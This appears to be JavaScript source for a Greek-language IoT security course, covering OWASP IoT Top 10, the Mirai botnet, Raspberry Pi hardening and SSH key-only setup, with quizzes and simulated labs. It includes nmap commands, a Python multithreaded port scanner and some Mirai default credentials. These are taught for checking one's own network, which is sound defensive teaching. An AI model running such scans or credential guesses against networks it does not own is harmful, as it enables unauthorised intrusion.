      { from: 'att', to: 'esp', pkt: '.1 is-at de:ad… (×50)', color: RED, mark: { att: 'bad', esp: 'hl' }, say: 'Οι επαναλήψεις κάθε 1–2 δευτερόλεπτα είναι το κλασικό «αποτύπωμα» εργαλείων όπως το arpspoof.' },
      { from: 'pi', via: ['rt'], to: 'esp', pkt: '🚨 alert', color: YEL, say: 'Το Pi στέλνει ειδοποίηση (MQTT/Telegram) και καταγράφει το συμβάν. Η κίνηση του ESP32 όμως είναι ήδη **TLS**, άρα ο MITM δεν διαβάζει τίποτα.' },
    ],
  });

  ACADEMY.scene('iot-heartbeat', {
    w: 640, h: 250, speed: 2500,
    intro: 'Πώς ξέρεις ότι ένας αισθητήρας είναι **ζωντανός** και **φυσιολογικός**; Heartbeat + Last Will + μια μικρή υπηρεσία παρακολούθησης στο Pi.',
    nodes: [
      { id: 'esp', x: 90, y: 110, icon: '📟', label: 'ESP32\nsensor01' },
      { id: 'br', x: 320, y: 110, icon: '🍓', label: 'Mosquitto' },
      { id: 'mon', x: 550, y: 110, icon: '🩺', label: 'monitor.py' },
    ],
    links: [['esp', 'br', 'wifi'], ['br', 'mon']],
    tables: [{ id: 'st', title: 'monitor.py', head: ['Συσκευή', 'Τελευταίο', 'Κατάσταση'], rows: [] }],
    steps: [
      { from: 'esp', to: 'br', pkt: 'CONNECT + LWT', color: PURP, say: 'Στο CONNECT το ESP32 δηλώνει **Last Will**: «αν χαθώ, δημοσίευσε `offline` στο `home/sensor01/status`».' },
      { from: 'esp', via: ['br'], to: 'mon', pkt: '♥ uptime=60 rssi=-61', color: GREEN, table: { st: [['sensor01', 'πριν 1s', '🟢 online']] }, say: 'Κάθε 60s: heartbeat με uptime, RSSI, ελεύθερη μνήμη, λόγο επανεκκίνησης.' },
      { from: 'esp', via: ['br'], to: 'mon', pkt: '♥ heap 31k↓ rssi=-88', color: YEL, mark: { esp: 'hl' }, table: { st: [['sensor01', 'πριν 1s', '🟡 ανωμαλία: RSSI −27dB']] }, say: 'Το RSSI έπεσε απότομα και η μνήμη μειώνεται → πιθανό πρόβλημα (ή evil twin / jamming). Ο monitor το σημειώνει.' },
      { from: 'esp', to: 'br', pkt: '✂ ρεύμα', color: RED, drop: true, mark: { esp: 'bad' }, say: 'Κάποιος αποσύνδεσε τη συσκευή. Δεν στέλνει τίποτα πια.' },
      { from: 'br', to: 'mon', pkt: 'LWT: offline', color: RED, mark: { mon: 'hl' }, table: { st: [['sensor01', 'πριν 95s', '🔴 offline (LWT)']] }, say: 'Μετά το keepalive timeout ο broker δημοσιεύει το **Last Will** → ο monitor σηκώνει ειδοποίηση.' },
    ],
  });

  ACADEMY.scene('iot-final-flow', {
    w: 640, h: 280, speed: 2600,
    intro: 'Το τελικό project: **DHT22 → ESP32 → MQTT over TLS → Mosquitto στο Pi → dashboard**, με ασφάλεια σε κάθε βήμα.',
    nodes: [
      { id: 'dht', x: 60, y: 140, icon: '🌡️', label: 'DHT22' },
      { id: 'esp', x: 170, y: 140, icon: '📟', label: 'ESP32\nsecrets+CA' },
      { id: 'ap', x: 290, y: 140, icon: '📶', label: 'IoT SSID\nWPA2/3' },
      { id: 'br', x: 420, y: 140, icon: '🍓', label: 'Pi :8883\nACL' },
      { id: 'db', x: 570, y: 55, icon: '📊', label: 'Dashboard\n127.0.0.1' },
      { id: 'me', x: 570, y: 225, icon: '💻', label: 'Εσύ\nSSH tunnel' },
    ],
    links: [['dht', 'esp', '1‑wire'], ['esp', 'ap', 'wifi'], ['ap', 'br'], ['br', 'db'], ['db', 'me'], ['br', 'me']],
    steps: [
      { from: 'dht', to: 'esp', pkt: '22.4°C 48%', color: BLUE, say: 'Το ESP32 διαβάζει τον DHT22 και **ελέγχει** τις τιμές (NaN, όρια).' },
      { from: 'esp', via: ['ap'], to: 'br', pkt: 'TLS + user/pass', color: GREEN, mark: { esp: 'ok', ap: 'ok' }, say: 'Σύνδεση μέσα από χωριστό IoT δίκτυο, TLS με τη δική σου CA, μοναδικός χρήστης ανά συσκευή.' },
      { from: 'esp', via: ['ap'], to: 'br', pkt: 'PUB home/sensor01/state', color: GREEN, mark: { br: 'ok' }, say: 'Η ACL επιτρέπει στο `sensor01` να γράφει **μόνο** κάτω από `home/sensor01/`.' },
      { from: 'br', to: 'db', pkt: '{"t":22.4,"h":48}', color: BLUE, mark: { db: 'ok' }, say: 'Το dashboard (user με δικαίωμα μόνο ανάγνωσης) αποθηκεύει σε SQLite και σερβίρει σελίδα με autoescape.' },
      { from: 'me', to: 'db', pkt: 'ssh -L 8080', color: PURP, mark: { me: 'ok' }, say: 'Εσύ βλέπεις το dashboard μέσα από **SSH tunnel**: δεν είναι ανοιχτό σε κανέναν άλλον.' },
    ],
  });

  const M = [];

  // ====================================================================
  // MODULE 1 — Τι είναι το IoT και γιατί χακάρεται
  // ====================================================================
  M.push({
    id: 'iot-1', order: 1, title: 'Τι είναι το IoT και γιατί χακάρεται',
    desc: 'Attack surface, OWASP IoT Top 10 και το Mirai: γιατί ένα «απλό» ESP32 είναι στόχος.',
    lessons: [
      {
        id: 'iot-1-1', title: 'IoT, attack surface και OWASP IoT Top 10', minutes: 14,
        goal: 'Να καταλάβεις από **πόσα σημεία** μπορεί να επιτεθεί κάποιος σε μια IoT συσκευή και να γνωρίζεις τα 10 πιο συχνά λάθη (OWASP IoT Top 10).',
        blocks: [
          text(
            '**IoT (Internet of Things)** είναι κάθε συσκευή που δεν είναι «υπολογιστής» αλλά έχει επεξεργαστή και σύνδεση στο δίκτυο: ο αισθητήρας θερμοκρασίας με ESP32, η κάμερα, το έξυπνο φις, το Raspberry Pi που ελέγχει το πότισμα.',
            '',
            'Ο λόγος που χακάρονται τόσο συχνά είναι απλός:',
            '- Είναι **φτηνές** και φτιάχνονται γρήγορα, οπότε η ασφάλεια μένει «για μετά».',
            '- Τρέχουν **24/7** και κανείς δεν τις κοιτάει (δεν έχουν οθόνη για να δεις ότι κάτι πάει στραβά).',
            '- Σπάνια παίρνουν **ενημερώσεις**.',
            '- Βρίσκονται στο **ίδιο δίκτυο** με το laptop σου, άρα είναι τέλειο σκαλοπάτι για επίθεση παρακάτω.',
            '',
            '### Attack surface: οι 5 «πόρτες»',
            'Το **attack surface** είναι το σύνολο των σημείων από όπου μπορεί να μπει κάποιος. Στο IoT είναι πολύ μεγαλύτερο απ’ ό,τι νομίζεις:'
          ),
          table(['Επίπεδο', 'Παράδειγμα επίθεσης', 'Άμυνα (σε ποια ενότητα)'], [
            ['**Hardware**', 'UART/JTAG pins, ανάγνωση SPI flash με `esptool`', 'Flash encryption, disable JTAG (Εν. 5–6)'],
            ['**Firmware**', 'OTA χωρίς υπογραφή, hardcoded κωδικοί', 'Secure Boot, signed OTA, secrets εκτός κώδικα (Εν. 3, 5)'],
            ['**Δίκτυο**', 'MQTT/HTTP χωρίς TLS, Telnet, UPnP', 'TLS, firewall, segmentation (Εν. 4, 7)'],
            ['**Cloud/Backend**', 'Broker με anonymous πρόσβαση, αδύναμα API', 'Auth, ACL, ελάχιστα δικαιώματα (Εν. 4)'],
            ['**App/Χρήστης**', 'Κλειδιά μέσα στο app, default κωδικοί', 'Μοναδικά credentials, provisioning (Εν. 2–3)'],
          ]),
          anim('iot-attack-surface', 'Πάτα ▶: ο επιτιθέμενος δοκιμάζει κάθε επίπεδο. Αρκεί **ένα** ανοιχτό για να χάσεις τη συσκευή.'),
          text(
            '### OWASP IoT Top 10 (2018)',
            'Ο οργανισμός **OWASP** μάζεψε τα πιο συχνά λάθη σε IoT συσκευές. Είναι σαν checklist: αν τα αποφύγεις και τα 10, είσαι ήδη καλύτερα από τις περισσότερες εμπορικές συσκευές.'
          ),
          table(['#', 'Κίνδυνος', 'Τι σημαίνει πρακτικά για ESP32/Pi'], [
            ['I1', 'Weak, guessable or hardcoded passwords', '`pi/raspberry`, κωδικός Wi‑Fi μέσα στο `.ino` στο GitHub'],
            ['I2', 'Insecure network services', 'Telnet, SSH με κωδικό, MQTT 1883 ανοιχτό σε όλους'],
            ['I3', 'Insecure ecosystem interfaces', 'Web panel/API/cloud χωρίς auth ή χωρίς TLS'],
            ['I4', 'Lack of secure update mechanism', 'OTA χωρίς κωδικό ή υπογραφή, καμία ενημέρωση στο Pi'],
            ['I5', 'Use of insecure or outdated components', 'Παλιό Arduino core / ESP-IDF, παλιές βιβλιοθήκες'],
            ['I6', 'Insufficient privacy protection', 'Αισθητήρας που στέλνει δεδομένα σε τρίτους χωρίς λόγο'],
            ['I7', 'Insecure data transfer and storage', 'Plaintext MQTT, κωδικοί στο flash χωρίς κρυπτογράφηση'],
            ['I8', 'Lack of device management', 'Δεν ξέρεις ποιες συσκευές έχεις και ποια έκδοση τρέχουν'],
            ['I9', 'Insecure default settings', '`allow_anonymous true`, `setInsecure()`, debug ανοιχτό'],
            ['I10', 'Lack of physical hardening', 'Ανοιχτό UART, JTAG, χωρίς flash encryption'],
          ]),
          tip('Κράτα αυτόν τον πίνακα. Στο **τελικό project** (Εν. 9) θα κάνουμε checklist όπου κάθε γραμμή αντιστοιχεί σε κάποιο από αυτά.'),
          warn(
            '**Κανόνας της διαδρομής:** όλα όσα θα δεις (σάρωση, sniffing, ανάγνωση flash) τα κάνεις **μόνο σε δικές σου συσκευές και στο δικό σου δίκτυο**. Σε ξένα συστήματα είναι παράνομο, ακόμα κι αν «απλώς κοιτάς».'
          ),
          quiz('Ο κωδικός του Wi‑Fi είναι γραμμένος μέσα στο `main.ino`, που ανέβηκε σε δημόσιο repo στο GitHub. Σε ποια κατηγορία του OWASP IoT Top 10 ανήκει κυρίως;',
            ['I1: Weak, guessable or hardcoded passwords', 'I6: Insufficient privacy protection', 'I10: Lack of physical hardening', 'I5: Outdated components'], 0,
            'Είναι **hardcoded credential**. Όποιος βρει το repo (και υπάρχουν bots που σαρώνουν το GitHub για κωδικούς σε λίγα λεπτά) ξέρει τον κωδικό του δικτύου σου.'),
          quiz('Ποιο από τα παρακάτω ανήκει στο **hardware** attack surface;',
            ['Το MQTT χωρίς TLS', 'Τα ανοιχτά pins UART/JTAG στην πλακέτα', 'Το API του cloud', 'Ο κωδικός SSH'], 1,
            'Τα UART/JTAG είναι φυσικές διεπαφές: χρειάζεται κάποιος να έχει τη συσκευή στα χέρια του, αλλά τότε μπορεί να διαβάσει ή να γράψει το firmware.'),
        ],
      },
      {
        id: 'iot-1-2', title: 'Mirai: πώς οι default κωδικοί έριξαν το μισό Internet', minutes: 15,
        goal: 'Να καταλάβεις βήμα-βήμα πώς δούλεψε το **Mirai** και να ελέγξεις το **δικό σου** δίκτυο για τα ίδια λάθη (Telnet, default κωδικοί) με `nmap` και Python.',
        blocks: [
          text(
            'Τον Σεπτέμβριο–Οκτώβριο του 2016 εμφανίστηκε το **Mirai**. Δεν χρησιμοποίησε καμία έξυπνη ευπάθεια. Έκανε κάτι πολύ απλό:',
            '1. Σάρωνε τυχαίες IP του Internet στις θύρες **23 και 2323 (Telnet)**.',
            '1. Δοκίμαζε μια λίστα με **~60 εργοστασιακούς κωδικούς** (`root/xc3511`, `admin/admin`, `root/vizxv`…).',
            '1. Όπου έμπαινε, κατέβαζε το malware, και η συσκευή γινόταν **κι αυτή σαρωτής**.',
            '1. Όλο το botnet περίμενε εντολές από έναν **C&C server** για επιθέσεις DDoS.',
            '',
            'Στις 21 Οκτωβρίου 2016 μια επίθεση στον πάροχο DNS **Dyn** έκανε απρόσιτα για ώρες sites όπως Twitter, Netflix, Reddit και GitHub. Πίσω της ήταν εκατοντάδες χιλιάδες κάμερες και DVR.'
          ),
          anim('iot-mirai', 'Πάτα ▶ και δες γιατί η κάμερα C, με **μοναδικό κωδικό και Telnet κλειστό**, γλίτωσε.'),
          text(
            '### Τα μαθήματα του Mirai',
            '- **Κανένας default κωδικός.** Κάθε συσκευή μοναδικό, δυνατό κωδικό (ή καλύτερα: κλειδιά).',
            '- **Καμία περιττή υπηρεσία.** Το Telnet δεν έχει θέση σε συσκευή του 2026.',
            '- **Τίποτα εκτεθειμένο στο Internet** χωρίς λόγο (port forwarding, UPnP).',
            '- Μετά από reboot το Mirai χανόταν (ζούσε μόνο στη RAM), αλλά η συσκευή ξαναμολυνόταν σε λίγα λεπτά, γιατί το λάθος ήταν ακόμα εκεί.',
            '',
            '### Έλεγξε το δικό σου δίκτυο',
            'Ας ψάξουμε στο **δικό σου** LAN για συσκευές με θύρες που χρησιμοποιούν συνήθως IoT: Telnet, HTTP panels, MQTT χωρίς TLS, RTSP (κάμερες).'
          ),
          code('bash', 'Σάρωση του ΔΙΚΟΥ σου LAN με nmap (από Pi ή laptop)', R`
# Βρες το δικό σου υποδίκτυο (π.χ. 192.168.1.0/24)
ip -4 addr show | grep inet

# Εγκατάσταση nmap (Raspberry Pi OS / Debian)
sudo apt update && sudo apt install -y nmap

# Ποιες συσκευές είναι ζωντανές;
sudo nmap -sn 192.168.1.0/24

# Ποιες έχουν «επικίνδυνες» IoT θύρες ανοιχτές;
sudo nmap -sS -p 23,2323,80,8080,1883,554,3232,8266 --open 192.168.1.0/24
`, L(
            '- `ip -4 addr show`: δείχνει την IP σου και το /24 ή /16 του δικτύου.',
            '- `nmap -sn`: μόνο **host discovery** (ping/ARP), χωρίς σάρωση θυρών.',
            '- `-sS`: SYN scan (γρήγορο, χρειάζεται `sudo`).',
            '- `23,2323`: Telnet (ο στόχος του Mirai). `80,8080`: web panels. `1883`: MQTT **χωρίς** TLS. `554`: RTSP κάμερες. `3232`: ArduinoOTA του ESP32. `8266`: OTA του ESP8266.',
            '- `--open`: δείχνει μόνο ανοιχτές θύρες, για να μη χαθείς στο output.'
          )),
          text('Αν δεν έχεις nmap, το ίδιο μπορείς να το κάνεις με λίγη **Python** (τρέχει σε Pi, Mac, Linux). Είναι και καλή άσκηση για να καταλάβεις τι κάνει ένας σαρωτής:'),
          code('python', 'iot_port_check.py: απλός TCP σαρωτής για το ΔΙΚΟ σου LAN', R`
#!/usr/bin/env python3
"""Ελέγχει το δικό σου υποδίκτυο για θύρες που συνήθως είναι επικίνδυνες σε IoT."""
import ipaddress
import socket
from concurrent.futures import ThreadPoolExecutor

SUBNET = "192.168.1.0/24"          # άλλαξέ το στο δικό σου
PORTS = {23: "Telnet", 2323: "Telnet-alt", 1883: "MQTT χωρίς TLS",
         80: "HTTP panel", 554: "RTSP", 3232: "ArduinoOTA"}

def check(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        if s.connect_ex((str(ip), port)) == 0:   # 0 = η σύνδεση πέτυχε
            return (str(ip), port)
    finally:
        s.close()
    return None

jobs = [(ip, p) for ip in ipaddress.ip_network(SUBNET).hosts() for p in PORTS]
with ThreadPoolExecutor(max_workers=100) as ex:
    for res in ex.map(lambda a: check(*a), jobs):
        if res:
            ip, port = res
            level = "🔴" if port in (23, 2323, 3232) else "🟡"
            print(f"{level} {ip}:{port}  {PORTS[port]}")
print("Τέλος σάρωσης.")
`, L(
            '- `ipaddress.ip_network(SUBNET).hosts()`: όλες οι IP του δικτύου εκτός από network και broadcast.',
            '- `connect_ex()`: προσπαθεί TCP σύνδεση και επιστρέφει `0` αν η θύρα είναι ανοιχτή (αντί να πετάξει exception).',
            '- `settimeout(0.5)`: δεν περιμένουμε για πάντα κλειστές/φιλτραρισμένες θύρες.',
            '- `ThreadPoolExecutor(max_workers=100)`: 100 έλεγχοι παράλληλα, αλλιώς θα έπαιρνε πολλά λεπτά.',
            '- Κόκκινο 🔴 για Telnet και OTA χωρίς έλεγχο: αυτά διορθώνονται **άμεσα**.'
          )),
          nw('pentest', 'Η καρτέλα **🔴 Pentest** του NetWatch κάνει τον ίδιο έλεγχο αυτόματα (θύρες, εκδόσεις λογισμικού, γνωστά CVE) για το δικό σου LAN.'),
          tip('Βρήκες Telnet ανοιχτό σε κάποια κάμερα; Ψάξε στις ρυθμίσεις της για «Telnet» ή «debug». Αν δεν απενεργοποιείται, βάλ’ την σε **χωριστό δίκτυο** (Εν. 7) και μπλόκαρέ της την πρόσβαση στο Internet.'),
          warn('Μη σαρώνεις δίκτυα που δεν σου ανήκουν (δουλειά, πανεπιστήμιο, γείτονες, καφετέριες). Ακόμα και μια «αθώα» σάρωση θυρών μπορεί να θεωρηθεί απόπειρα παράνομης πρόσβασης.'),
          quiz('Γιατί το Mirai «ξαναμόλυνε» συσκευές λίγα λεπτά μετά από reboot;',
            ['Γιατί έγραφε τον εαυτό του στο firmware', 'Γιατί ο default κωδικός και το Telnet ήταν ακόμα εκεί, οπότε κάποιο άλλο bot ξαναέμπαινε', 'Γιατί είχε rootkit στον bootloader', 'Γιατί ο router ήταν μολυσμένος'], 1,
            'Το Mirai ζούσε στη RAM και χανόταν με το reboot. Όμως η **αιτία** (default κωδικός + Telnet) δεν είχε διορθωθεί, και τα άλλα bots σάρωναν συνεχώς.'),
          quiz('Η θύρα 3232 είναι ανοιχτή σε ένα ESP32 σου. Τι σημαίνει πιθανότατα;',
            ['Τρέχει web server', 'Τρέχει ArduinoOTA: αν δεν έχει κωδικό, οποιοσδήποτε στο LAN μπορεί να ανεβάσει firmware', 'Είναι MQTT με TLS', 'Είναι Telnet'], 1,
            'Το **ArduinoOTA** ακούει στη 3232 στο ESP32. Χωρίς `setPassword`/`setPasswordHash` είναι ανοιχτή πόρτα για ξένο firmware. Θα το δούμε στην Εν. 5.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 2 — Ασφαλές setup στο Raspberry Pi
  // ====================================================================
  M.push({
    id: 'iot-2', order: 2, title: 'Ασφαλές setup στο Raspberry Pi',
    desc: 'Χρήστες, SSH μόνο με κλειδιά, fail2ban, ufw, αυτόματες ενημερώσεις και λιγότερες υπηρεσίες.',
    lessons: [
      {
        id: 'iot-2-1', title: 'Χρήστες και κωδικοί: τέλος το pi/raspberry', minutes: 12,
        goal: 'Να φτιάξεις δικό σου διαχειριστή, να καταργήσεις τον default χρήστη και να καταλάβεις γιατί το `sudo` χωρίς κωδικό είναι κίνδυνος.',
        blocks: [
          text(
            'Μέχρι τον Απρίλιο του 2022, κάθε Raspberry Pi OS ερχόταν με χρήστη **`pi`** και κωδικό **`raspberry`**. Τα bots το ξέρουν και το δοκιμάζουν πρώτο (θα το δεις στο animation του fail2ban).',
            '',
            'Οι νέες εκδόσεις (Bookworm και μετά) σε αναγκάζουν να ορίσεις χρήστη στο **Raspberry Pi Imager** ή στην πρώτη εκκίνηση. Πολλά Pi όμως τρέχουν ακόμα παλιές εικόνες, ή τα έστησες βιαστικά με `pi` και κωδικό `1234`.',
            '',
            '### Το σωστό στο Raspberry Pi Imager',
            '- Πάτα **Edit settings** (⚙️ ή Ctrl+Shift+X).',
            '- Όρισε **δικό σου username** (όχι `pi`, `admin`, `root`) και **δυνατό κωδικό**.',
            '- Στην καρτέλα **Services**: Enable SSH → **Allow public-key authentication only** και επικόλλησε το public key σου (θα το φτιάξουμε στο επόμενο μάθημα).',
            '- Όρισε Wi‑Fi country σωστά (GR) για νόμιμα κανάλια.'
          ),
          text('### Αν έχεις ήδη Pi με χρήστη pi'),
          code('bash', 'Νέος διαχειριστής και κατάργηση του pi', R`
# 1) Φτιάξε νέο χρήστη (θα σου ζητήσει κωδικό)
sudo adduser maria

# 2) Δώσ' του τα ίδια groups με τον pi (sudo, gpio, i2c, spi, video…)
groups pi
sudo usermod -aG sudo,adm,dialout,gpio,i2c,spi,video,plugdev,netdev maria

# 3) ΑΠΟΣΥΝΔΕΣΟΥ και ξαναμπές ως maria. Έλεγξε ότι το sudo δουλεύει:
sudo whoami          # πρέπει να τυπώσει: root

# 4) Κλείδωσε (ή σβήσε) τον παλιό χρήστη
sudo passwd -l pi                 # κλείδωμα κωδικού
sudo usermod -s /usr/sbin/nologin pi   # καμία shell
# ή, αν δεν τον χρειάζεσαι καθόλου:
# sudo deluser --remove-home pi
`, L(
            '- `adduser`: το φιλικό script του Debian. Φτιάχνει home directory και ζητάει κωδικό.',
            '- `groups pi`: δες σε ποια groups ήταν ο pi, για να μη χάσεις πρόσβαση σε GPIO/I2C/κάμερα.',
            '- `usermod -aG`: το `-a` (append) είναι **κρίσιμο**. Χωρίς αυτό σβήνεις τα υπόλοιπα groups του χρήστη.',
            '- Βήμα 3: **ποτέ** μη σβήσεις τον παλιό χρήστη πριν επιβεβαιώσεις ότι ο νέος έχει `sudo`. Αλλιώς κλειδώνεσαι έξω.',
            '- `passwd -l`: κλειδώνει τον κωδικό. Με `nologin` δεν μπορεί να πάρει shell ούτε με κλειδί.'
          )),
          text(
            '### Το παγίδευμα του sudo χωρίς κωδικό',
            'Στα παλιά Pi υπάρχει το αρχείο `/etc/sudoers.d/010_pi-nopasswd`, που επιτρέπει `sudo` **χωρίς** κωδικό. Αν κάποιος κλέψει το session σου (ή ένα script σου έχει bug), γίνεται αμέσως root.'
          ),
          code('bash', 'Έλεγχος και αφαίρεση NOPASSWD', R`
# Ποια αρχεία δίνουν sudo χωρίς κωδικό;
sudo grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/

# Αφαίρεση (ΜΟΝΟ αφού ξέρεις τον κωδικό του χρήστη σου!)
sudo rm /etc/sudoers.d/010_pi-nopasswd

# Έλεγχος σύνταξης των sudoers (ποτέ μην τα επεξεργάζεσαι με nano απευθείας)
sudo visudo -c
`, L(
            '- `grep -r NOPASSWD`: ψάχνει όλους τους κανόνες sudo χωρίς κωδικό.',
            '- `visudo -c`: ελέγχει ότι τα αρχεία sudoers είναι σωστά. Ένα λάθος εκεί μπορεί να σου κόψει **όλο** το sudo.',
            '- Για αλλαγές χρησιμοποίησε `sudo visudo -f /etc/sudoers.d/αρχείο`, που ελέγχει σύνταξη πριν αποθηκεύσει.'
          )),
          cli('Lab: νέος διαχειριστής στο Pi', 'pi@raspberrypi:~ $', 'Raspberry Pi OS (προσομοίωση). Είσαι συνδεδεμένος ως pi.', [
            { task: 'Φτιάξε νέο χρήστη με όνομα `maria` (με `sudo adduser`).', expect: '^sudo\\s+adduser\\s+maria$', ans: 'sudo adduser maria', out: 'Adding user `maria\' ...\nCreating home directory `/home/maria\' ...\nNew password: ********\nRetype new password: ********\npasswd: password updated successfully' },
            { task: 'Πρόσθεσε τη maria στο group `sudo` (μην ξεχάσεις το `-a`).', expect: '^sudo\\s+usermod\\s+-(aG|Ga)\\s+\\S*sudo\\S*\\s+maria$', ans: 'sudo usermod -aG sudo maria', out: '', err: 'Χρησιμοποίησε: sudo usermod -aG sudo maria' },
            { task: 'Κλείδωσε τον κωδικό του χρήστη `pi`.', expect: '^sudo\\s+passwd\\s+-l\\s+pi$', ans: 'sudo passwd -l pi', out: 'passwd: password changed.' },
            { task: 'Βρες αν υπάρχει κανόνας sudo χωρίς κωδικό στο `/etc/sudoers.d/`.', expect: '^sudo\\s+grep\\s+(-r\\s+)?NOPASSWD\\s+/etc/sudoers', ans: 'sudo grep -r NOPASSWD /etc/sudoers.d/', out: '/etc/sudoers.d/010_pi-nopasswd:pi ALL=(ALL) NOPASSWD: ALL' },
            { task: 'Σβήσε αυτό το αρχείο.', expect: '^sudo\\s+rm\\s+(-f\\s+)?/etc/sudoers\\.d/010_pi-nopasswd$', ans: 'sudo rm /etc/sudoers.d/010_pi-nopasswd', out: '' },
            { task: 'Έλεγξε τη σύνταξη των sudoers.', expect: '^sudo\\s+visudo\\s+-c$', ans: 'sudo visudo -c', out: '/etc/sudoers: parsed OK\n/etc/sudoers.d/README: parsed OK' },
          ], 'Ο default χρήστης δεν είναι πια πόρτα εισόδου.'),
          tip('Χρησιμοποίησε **password manager** (Bitwarden, KeePassXC) για τους κωδικούς των Pi. Ένας κωδικός 20 τυχαίων χαρακτήρων ανά συσκευή είναι πρακτικά αδύνατο να «μαντευτεί».'),
          quiz('Γιατί το `-a` στο `usermod -aG sudo maria` είναι σημαντικό;',
            ['Κάνει τον χρήστη admin', 'Χωρίς αυτό, ο χρήστης αφαιρείται από όλα τα άλλα groups του', 'Ενεργοποιεί το SSH', 'Δεν έχει καμία σημασία'], 1,
            'Το `-G` μόνο του **αντικαθιστά** τη λίστα groups. Με `-a` (append) προσθέτεις στα υπάρχοντα.'),
        ],
      },
      {
        id: 'iot-2-2', title: 'SSH μόνο με κλειδιά (sshd_config)', minutes: 16,
        goal: 'Να φτιάξεις ζεύγος κλειδιών **ed25519**, να το βάλεις στο Pi και να απενεργοποιήσεις εντελώς τους κωδικούς και το root login στο SSH, χωρίς να κλειδωθείς έξω.',
        blocks: [
          text(
            'Με κωδικό, ένα bot μπορεί να δοκιμάσει εκατομμύρια συνδυασμούς. Με **κλειδί**, πρέπει να μαντέψει έναν αριθμό 256 bit. Αυτό δεν θα συμβεί ποτέ.',
            '',
            'Το **ζεύγος κλειδιών** έχει δύο κομμάτια:',
            '- **Ιδιωτικό** (`~/.ssh/id_ed25519`): μένει **μόνο** στο laptop σου, προστατευμένο με passphrase.',
            '- **Δημόσιο** (`~/.ssh/id_ed25519.pub`): το βάζεις σε όσα Pi θέλεις. Δεν είναι μυστικό.'
          ),
          code('bash', 'Στο laptop σου (Mac/Linux/Windows PowerShell)', R`
# 1) Φτιάξε κλειδί ed25519 (σύγχρονο, μικρό, γρήγορο)
ssh-keygen -t ed25519 -a 100 -C "maria@laptop"

# 2) Αντέγραψε το δημόσιο κλειδί στο Pi (μία φορά, με κωδικό)
ssh-copy-id -i ~/.ssh/id_ed25519.pub maria@raspberrypi.local

# 3) Δοκίμασε: πρέπει να μπεις ΧΩΡΙΣ κωδικό Pi (ίσως ζητήσει την passphrase του κλειδιού)
ssh maria@raspberrypi.local
`, L(
            '- `-t ed25519`: τύπος κλειδιού. Προτίμησέ τον από RSA: ασφαλής και πολύ σύντομος.',
            '- `-a 100`: 100 γύροι KDF για την passphrase. Αν κλέψουν το αρχείο, το brute force της passphrase γίνεται αργό.',
            '- `-C`: σχόλιο για να ξέρεις ποιο κλειδί είναι ποιο μέσα στο `authorized_keys`.',
            '- `ssh-copy-id`: προσθέτει το public key στο `~/.ssh/authorized_keys` του Pi με τα σωστά permissions.',
            '- Στα Windows χωρίς `ssh-copy-id`: `type $env:USERPROFILE\\.ssh\\id_ed25519.pub | ssh maria@raspberrypi.local "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"`.'
          )),
          text(
            '### Κλείνουμε τους κωδικούς στο Pi',
            'Αντί να αλλάξουμε το μεγάλο `/etc/ssh/sshd_config`, φτιάχνουμε ένα **drop-in** αρχείο στο `/etc/ssh/sshd_config.d/`. Το κύριο αρχείο το φορτώνει με `Include` στην αρχή του.',
            '',
            'Προσοχή στη σειρά: στο OpenSSH **κερδίζει η πρώτη τιμή** που βρίσκει. Τα αρχεία διαβάζονται αλφαβητικά, γι’ αυτό το όνομα ξεκινά με `01-`: έτσι κερδίζει ένα πιθανό `50-cloud-init.conf` που ενεργοποιεί κωδικούς.'
          ),
          code('text', '/etc/ssh/sshd_config.d/01-hardening.conf', R`
# --- Ταυτοποίηση ---
PasswordAuthentication no
KbdInteractiveAuthentication no
PubkeyAuthentication yes
PermitRootLogin no
PermitEmptyPasswords no
AuthenticationMethods publickey

# --- Ποιοι επιτρέπονται ---
AllowUsers maria

# --- Περιορισμός brute force / αδρανών συνδέσεων ---
MaxAuthTries 3
LoginGraceTime 20
ClientAliveInterval 300
ClientAliveCountMax 2

# --- Λιγότερο attack surface ---
X11Forwarding no
AllowAgentForwarding no
`, L(
            '- `PasswordAuthentication no` + `KbdInteractiveAuthentication no`: κλείνουν **και τους δύο** τρόπους να μπεις με κωδικό.',
            '- `PermitRootLogin no`: ο root δεν μπαίνει ποτέ απευθείας. Μπαίνεις ως maria και κάνεις `sudo`.',
            '- `AuthenticationMethods publickey`: ρητά, μόνο κλειδί.',
            '- `AllowUsers maria`: whitelist. Ακόμα κι αν κάποιος φτιάξει άλλον χρήστη, δεν μπαίνει με SSH.',
            '- `MaxAuthTries 3`, `LoginGraceTime 20`: κόβουν γρήγορα όσους «ψαρεύουν».',
            '- `ClientAlive…`: κλείνει sessions που ξεχάστηκαν ανοιχτά μετά από ~10 λεπτά αδράνειας.',
            '- `X11Forwarding`, `AllowAgentForwarding`: δεν τα χρειάζεσαι σε headless Pi.'
          )),
          code('bash', 'Εφαρμογή με ασφάλεια', R`
# 1) Έλεγχος σύνταξης. Αν τυπώσει κάτι, ΔΙΟΡΘΩΣΕ πριν το restart
sudo sshd -t

# 2) Δες την τελική, «ενεργή» ρύθμιση
sudo sshd -T | grep -Ei 'passwordauth|kbdinteractive|permitroot|allowusers'

# 3) Restart (στο Raspberry Pi OS η υπηρεσία λέγεται ssh)
sudo systemctl restart ssh

# 4) ΣΕ ΝΕΟ ΤΕΡΜΑΤΙΚΟ (κράτα το παλιό ανοιχτό!) δοκίμασε:
ssh maria@raspberrypi.local                              # πρέπει να μπει
ssh -o PubkeyAuthentication=no maria@raspberrypi.local   # πρέπει: Permission denied (publickey)
`, L(
            '- `sshd -t`: test mode. Δεν επανεκκινεί τίποτα, μόνο ελέγχει.',
            '- `sshd -T`: τυπώνει όλες τις τιμές όπως τις «βλέπει» το sshd μετά από όλα τα Include. Εδώ επιβεβαιώνεις ότι κέρδισε το δικό σου αρχείο.',
            '- Το βήμα 4 είναι το πιο σημαντικό: **δεν κλείνεις** το παλιό session μέχρι να επιβεβαιώσεις ότι το νέο δουλεύει.',
            '- Η δεύτερη εντολή αναγκάζει τον client να μη χρησιμοποιήσει κλειδί, για να επιβεβαιώσεις ότι ο κωδικός **δεν** γίνεται δεκτός.'
          )),
